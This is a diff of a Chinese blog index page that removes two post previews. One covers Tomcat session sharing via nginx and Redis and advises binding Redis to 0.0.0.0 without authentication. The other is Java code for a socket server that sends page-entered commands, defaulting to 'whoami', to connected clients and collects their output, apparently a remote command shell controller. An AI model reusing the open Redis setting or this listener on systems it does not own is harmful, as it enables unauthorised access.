</span><br><span class="line">String basePath = request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">  &lt;head&gt;  </span><br><span class="line">    &lt;base href=&quot;&lt;%=basePath%&gt;&quot;&gt;  </span><br><span class="line">    &lt;title&gt;My JSP &apos;index.jsp&apos; starting page&lt;/title&gt;  </span><br><span class="line">    &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class="line">    &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;  </span><br><span class="line">    &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;      </span><br><span class="line">    &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;  </span><br><span class="line">    &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;  </span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;styles.css&quot;&gt;</span><br><span class="line">    --&gt;  </span><br><span class="line">  &lt;/head&gt;  </span><br><span class="line">  &lt;body&gt;  </span><br><span class="line">        SessionID:&lt;%=session.getId()%&gt;  </span><br><span class="line">        &lt;BR&gt;  </span><br><span class="line">        SessionIP:&lt;%=request.getServerName()%&gt;  </span><br><span class="line">        &lt;BR&gt;  </span><br><span class="line">        SessionPort:&lt;%=request.getServerPort()%&gt;  </span><br><span class="line">        &lt;%  </span><br><span class="line">        out.println(&quot;This is Tomcat Server 22222&quot;);  </span><br><span class="line">        %&gt;  </span><br><span class="line">  &lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h6 id="2-nginx"><a href="#2-nginx" class="headerlink" title="2.nginx"></a>2.nginx</h6><p>不使用ngnix也行，在浏览器手动分别访问两个tomcat<br><br>编辑/etc/nginx/nginx.conf 添加tomcat配置<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">upstream tomcat&#123;</span><br><span class="line">	#ip_hash;</span><br><span class="line">	server   192.168.93.132:8081	weight=1;</span><br><span class="line">	server   192.168.93.133:8080	weight=1;</span><br><span class="line">	&#125;</span><br><span class="line">server&#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name localhost 127.0.0.1;</span><br><span class="line">            location / &#123;</span><br><span class="line">                root    html;</span><br><span class="line">                index   index.jsp;</span><br><span class="line">                proxy_pass      http://tomcat;</span><br><span class="line">                proxy_set_header        X-Real-IP       $remote_addr;</span><br><span class="line">                client_max_body_size    100m;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="3-redis"><a href="#3-redis" class="headerlink" title="3.redis"></a>3.redis</h6><p>这一步很坑，参照：<a href="https://my.oschina.net/Listening/blog/674759" target="_blank" rel="noopener">https://my.oschina.net/Listening/blog/674759</a>, 进行配置<br></p>
-<p>将生成的jar包全部放入tomcat/lib/目录下<br><br>编辑tomcat/conf/content.xml文件,添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context&gt;</span><br><span class="line">    ........</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;Valve className=&quot;org.apache.catalina.valves.CometConnectionManagerValve&quot; /&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">&lt;Valve className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionHandlerValve&quot; /&gt;</span><br><span class="line">&lt;Manager className=&quot;com.orangefunction.tomcat.redissessions.RedisSessionManager&quot;</span><br><span class="line">    host=&quot;127.0.0.1&quot; //注意这里，应该是redis地址</span><br><span class="line">    port=&quot;6379&quot;</span><br><span class="line">    database=&quot;0&quot;</span><br><span class="line">    maxInactiveInterval=&quot;60&quot;</span><br><span class="line">/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Context&gt;</span><br></pre></td></tr></table></figure></p>
-<p>在这里可能会出现redis连接不上问题，原因是/etc/redis/redis.conf 文件里默认配置为 bind 127.0.0.1, 改为 0.0.0.0<br><br>除此之外也有可能防火墙原因.<br><br>重启 redis-server /etc/redis/redis.conf <br><br>查看是否监听0.0.0.0:6379端口 ps -ef | grep redis<br><img src="./redis.png" alt="redisport"></p>
-<h4 id="4-重启tomcat-查看效果"><a href="#4-重启tomcat-查看效果" class="headerlink" title="4. 重启tomcat 查看效果"></a>4. 重启tomcat 查看效果</h4><p><img src="./tomcat1.png" alt="redisport"><br><img src="./tomcat2.png" alt="redisport"></p>
-<p>可以看到现在session已经保持不变</p>
-<h4 id="5-2018-12-26补充"><a href="#5-2018-12-26补充" class="headerlink" title="5.2018-12-26补充"></a>5.2018-12-26补充</h4><p>公司项目是用的tomcat6部署，所以直接用上面打包好的jar包会报:java.lang.AbstractMethodError错误，意思是jar包冲突。<br><br>解决办法:<br><br>去github上下载tomcat6的分支，重新打包,将dist目录下所有jar包和bulid/lib目录下的tomcat-redis-session-XXXX.jar放到tomcat的lib目录下<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: &apos;java&apos;</span><br><span class="line">apply plugin: &apos;maven&apos;</span><br><span class="line">apply plugin: &apos;signing&apos;</span><br><span class="line"></span><br><span class="line">group = &apos;com.orangefunction&apos;</span><br><span class="line">version = &apos;1.2.0&apos;</span><br><span class="line"></span><br><span class="line">repositories &#123;</span><br><span class="line">  mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">compileJava &#123;</span><br><span class="line">  sourceCompatibility = 1.7</span><br><span class="line">  targetCompatibility = 1.7</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">  //compile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-catalina&apos;,</span><br><span class="line">   version: &apos;6.0.37&apos;</span><br><span class="line">  //用tomcat6.0.37的jar打包</span><br><span class="line">  compile fileTree(dir: &apos;pathto/your/tomcat6.0.37/lib&apos;, include: [&apos;*.jar&apos;])</span><br><span class="line">  compile group: &apos;redis.clients&apos;, name: &apos;jedis&apos;, version: &apos;2.5.2&apos;</span><br><span class="line">  compile group: &apos;org.apache.commons&apos;, name: &apos;commons-pool2&apos;, version: &apos;2.2&apos;</span><br><span class="line"></span><br><span class="line">  testCompile group: &apos;junit&apos;, name: &apos;junit&apos;, version: &apos;4.+&apos;</span><br><span class="line">  testCompile &apos;org.hamcrest:hamcrest-core:1.3&apos;</span><br><span class="line">  testCompile &apos;org.hamcrest:hamcrest-library:1.3&apos;</span><br><span class="line">  testCompile &apos;org.mockito:mockito-all:1.9.5&apos;</span><br><span class="line">  testCompile group: &apos;org.apache.tomcat&apos;, name: &apos;tomcat-coyote&apos;, version: &apos;6.0.37&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在部署时，注意className名字，和你打包生成的一致<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Valve className=&quot;com.radiadesign.catalina.session.RedisSessionHandlerValve&quot; /&gt;</span><br><span class="line">&lt;Manager className=&quot;com.radiadesign.catalina.session.RedisSessionManager&quot;</span><br><span class="line">         host=&quot;localhost&quot; &lt;!-- optional: defaults to &quot;localhost&quot; --&gt;</span><br><span class="line">         port=&quot;6379&quot; &lt;!-- optional: defaults to &quot;6379&quot; --&gt;</span><br><span class="line">         database=&quot;0&quot; &lt;!-- optional: defaults to &quot;0&quot; --&gt;</span><br><span class="line">         maxInactiveInterval=&quot;60&quot; &lt;!-- optional: defaults to &quot;60&quot; (in seconds) --&gt; /&gt;</span><br></pre></td></tr></table></figure></p>
-<p>如果还报configure XXX.xml错误<br><br>到tomcat/conf/Catalina/localhost目录下，只保留你的项目.xml</p>
-<h3 id="2019-5-29补充"><a href="#2019-5-29补充" class="headerlink" title="2019/5/29补充"></a>2019/5/29补充</h3><p>基于tomcat内存的方式:<br><a href="https://www.cnblogs.com/beyang/p/9122406.html" target="_blank" rel="noopener">https://www.cnblogs.com/beyang/p/9122406.html</a></p>
-<h3 id="2019-6-4补充"><a href="#2019-6-4补充" class="headerlink" title="2019/6/4补充"></a>2019/6/4补充</h3><p>tomcat7版本，注意jar包冲突<br><br>经测试的一个可用版本：<br></p>
-<ul>
-<li>apache-tomcat-7.0.61</li>
-<li>commons-logging-1.1.3.jar</li>
-<li>commons-pool-1.6.jar</li>
-<li>commons-pool2-2.2.jar</li>
-<li>jedis-2.2.1.jar</li>
-<li>tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar</li>
-</ul>
-<p>tomcat-redis-session-manager-1.2-tomcat-7-1.2.jar为github下载源码打包<br><br><a href="https://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip" target="_blank" rel="noopener">https://github.com/jcoleman/tomcat-redis-session-manager/archive/1.2-tomcat-7.zip</a><br></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">tomcat</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/28/java/tomcat-session/tomcat-redis-session/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/socket/javasocket" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/26/java/socket/javasocket/">socket</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/26/java/socket/javasocket/" class="archive-article-date">
-  	<time datetime="2018-09-26T09:49:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-java-net-socket"><a href="#1-java-net-socket" class="headerlink" title="1.java.net.socket"></a>1.java.net.socket</h4><p>server端代码，使用子线程处理连接.</p>
-<h6 id="1-存储消息的队列"><a href="#1-存储消息的队列" class="headerlink" title="(1)存储消息的队列"></a>(1)存储消息的队列</h6><p>使用两个队列InMsgQueue和OutMsgueue来存储输入输出数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *客户端返回数据队列</span><br><span class="line"> */</span><br><span class="line">public class InMsgQueue &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 阻塞队列，存储返回的数据</span><br><span class="line">     */</span><br><span class="line">    private Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; ins ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static final InMsgQueue instance = new InMsgQueue();</span><br><span class="line"></span><br><span class="line">    private InMsgQueue()&#123;</span><br><span class="line">        ins =  new HashMap&lt;String, LinkedBlockingQueue&lt;String&gt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static final InMsgQueue getInstance()&#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; getDatas()&#123;</span><br><span class="line">        return this.ins;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>OutMsgQueue:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 维护要执行的命令</span><br><span class="line"> */</span><br><span class="line">public class OutMsgQueue &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 阻塞队列，存储页面输入的命令</span><br><span class="line">     */</span><br><span class="line">    private Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; outs ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private static final OutMsgQueue instance = new OutMsgQueue();</span><br><span class="line"></span><br><span class="line">    private OutMsgQueue()&#123;</span><br><span class="line">        outs =  new HashMap&lt;String, LinkedBlockingQueue&lt;String&gt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static final OutMsgQueue getInstance()&#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; getDatas()&#123;</span><br><span class="line">        return this.outs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h6 id="2-sockerServer"><a href="#2-sockerServer" class="headerlink" title="(2)sockerServer"></a>(2)sockerServer</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 单例创建全局socketserver</span><br><span class="line"> */</span><br><span class="line">public class SocketServer &#123;</span><br><span class="line"></span><br><span class="line">    private ServerSocket server = null;</span><br><span class="line">    private int port = 12354;</span><br><span class="line">    private final static int minPort = 1023;</span><br><span class="line">    private final static int maxPort = 65535;</span><br><span class="line">    private static final  SocketServer instance = new SocketServer();</span><br><span class="line"></span><br><span class="line">    private SocketServer()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if(port &gt;= minPort &amp;&amp; port &lt;= maxPort)&#123;</span><br><span class="line">                server = new ServerSocket(port);</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">                server = new ServerSocket(12354);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            System.out.println(&quot;sockerserver 创建失败 &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static final SocketServer getInstance()&#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public ServerSocket getServer()&#123;</span><br><span class="line">        return this.server;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPort(int port)&#123;</span><br><span class="line">        this.port = port;</span><br><span class="line">    &#125;</span><br><span class="line">    public int getPort()&#123;</span><br><span class="line">        return this.port;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h6 id="3-处理链接"><a href="#3-处理链接" class="headerlink" title="(3)处理链接"></a>(3)处理链接</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 处理单个socket的服务类</span><br><span class="line"> * 普通的socket消息收发,通过阻塞队列与页面进行交互</span><br><span class="line"> */</span><br><span class="line">public class SocketThread implements Runnable&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private Socket socket = null;</span><br><span class="line">    /**</span><br><span class="line">     * 每个socket的对应id</span><br><span class="line">     */</span><br><span class="line">    private String id;</span><br><span class="line"></span><br><span class="line">    public SocketThread(Socket socket)&#123;</span><br><span class="line">        this.socket = socket;</span><br><span class="line">        this.id = socket.getInetAddress().getHostAddress() + &quot;:&quot; + socket.getPort();</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void run()&#123;</span><br><span class="line">        Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapIn = InMsgQueue.getInstance().getDatas();</span><br><span class="line">        Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapOut = OutMsgQueue.getInstance().getDatas();</span><br><span class="line">        LinkedBlockingQueue&lt;String&gt; queueOut = mapOut.get(id);</span><br><span class="line">        LinkedBlockingQueue&lt;String&gt; queueIn = mapIn.get(id);</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));</span><br><span class="line">            OutputStream out = socket.getOutputStream();</span><br><span class="line">            String line = null;</span><br><span class="line">            while (true)&#123;</span><br><span class="line">                StringBuilder sb = new StringBuilder();</span><br><span class="line">                // 999999999 结束标志</span><br><span class="line">                while (!(line = in.readLine()).equals(&quot;999999999&quot;))&#123;</span><br><span class="line">                    sb.append(line);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;[+]: &quot; + sb.toString());</span><br><span class="line">                if(sb.toString().equals(&quot;exit()&quot;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                try &#123;</span><br><span class="line">                    queueIn.put(sb.toString());</span><br><span class="line">                &#125;catch (InterruptedException e2)&#123;</span><br><span class="line">                    e2.printStackTrace();</span><br><span class="line">                    queueIn.offer(e2.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                //读取队列中的命令，send</span><br><span class="line">                try &#123;</span><br><span class="line">                    //阻塞等待页面输入</span><br><span class="line">                    out.write(queueOut.take().getBytes());</span><br><span class="line">                &#125;catch (InterruptedException e1)&#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                    out.write(&quot;whoami&quot;.getBytes());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            in.close();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            //删除队列中的连接信息</span><br><span class="line">            mapIn.remove(id);</span><br><span class="line">            mapOut.remove(id);</span><br><span class="line">            try &#123;</span><br><span class="line">                if (socket != null)&#123;</span><br><span class="line">                    socket.close();</span><br><span class="line">                    System.out.println(&quot;[*]: 异常，关闭socket&quot; + id);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;catch (IOException e)&#123;</span><br><span class="line">                System.out.println(&quot;[*]: &quot; + id + &quot; 未正常关闭！ &quot; + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setSocket(Socket socket)&#123;</span><br><span class="line">        this.socket = socket;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h6 id="4-使用多线程处理不同socket"><a href="#4-使用多线程处理不同socket" class="headerlink" title="(4)使用多线程处理不同socket"></a>(4)使用多线程处理不同socket</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"> * 自动启动socket监听</span><br><span class="line"> */</span><br><span class="line">//控制bean的加载顺序  确保不为null</span><br><span class="line">@DependsOn(&#123;&quot;socketLogService&quot;,&quot;springUtil&quot;&#125;)</span><br><span class="line">@Component</span><br><span class="line">public class StartSocket implements ApplicationRunner &#123;</span><br><span class="line"></span><br><span class="line">    SocketLogService socketLogService = (SocketLogService)SpringUtil.getBean(&quot;socketLogService&quot;);</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run(ApplicationArguments args)&#123;</span><br><span class="line">        ServerSocket server = SocketServer.getInstance().getServer();</span><br><span class="line">        ThreadPoolExecutor executor = new ThreadPoolExecutor(4,4,24*60,</span><br><span class="line">                TimeUnit.MINUTES,new LinkedBlockingQueue&lt;&gt;());</span><br><span class="line">        try &#123;</span><br><span class="line">            while (true) &#123;</span><br><span class="line">                Socket socket = server.accept();</span><br><span class="line">                //连接日志</span><br><span class="line">                SocketLogEntity entity = new SocketLogEntity();</span><br><span class="line">                entity.setClientIp(socket.getInetAddress().getHostAddress());</span><br><span class="line">                entity.setClientPort(socket.getPort());</span><br><span class="line">                socketLogService.insertLog(entity);</span><br><span class="line">                //新来一个连接时，更新队列</span><br><span class="line">                Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapIn = InMsgQueue.getInstance().getDatas();</span><br><span class="line">                Map&lt;String, LinkedBlockingQueue&lt;String&gt;&gt; mapOut = OutMsgQueue.getInstance().getDatas();</span><br><span class="line">                String ip = socket.getInetAddress().getHostAddress() + &quot;:&quot; + socket.getPort();</span><br><span class="line">                if (!mapIn.containsKey(ip)) &#123;</span><br><span class="line">                    mapOut.put(ip, new LinkedBlockingQueue&lt;String&gt;());</span><br><span class="line">                    mapIn.put(ip, new LinkedBlockingQueue&lt;String&gt;());</span><br><span class="line">                &#125;</span><br><span class="line">                //开单独的线程进行处理连接</span><br><span class="line">                executor.execute(new SocketThread(socket));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="2-nio"><a href="#2-nio" class="headerlink" title="2.nio"></a>2.nio</h4><h4 id="3-netty"><a href="#3-netty" class="headerlink" title="3.netty"></a>3.netty</h4>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/26/java/socket/javasocket/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/12/24/base/httpandsocket/http与socket/">展开全文 >></a>
         </p>
       
 
@@ -1001,7 +977,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
     </nav>
   
 
@@ -1096,11 +1072,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Index</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">tools</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">interview</a>
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
              
               <li class="article-tag-list-item">
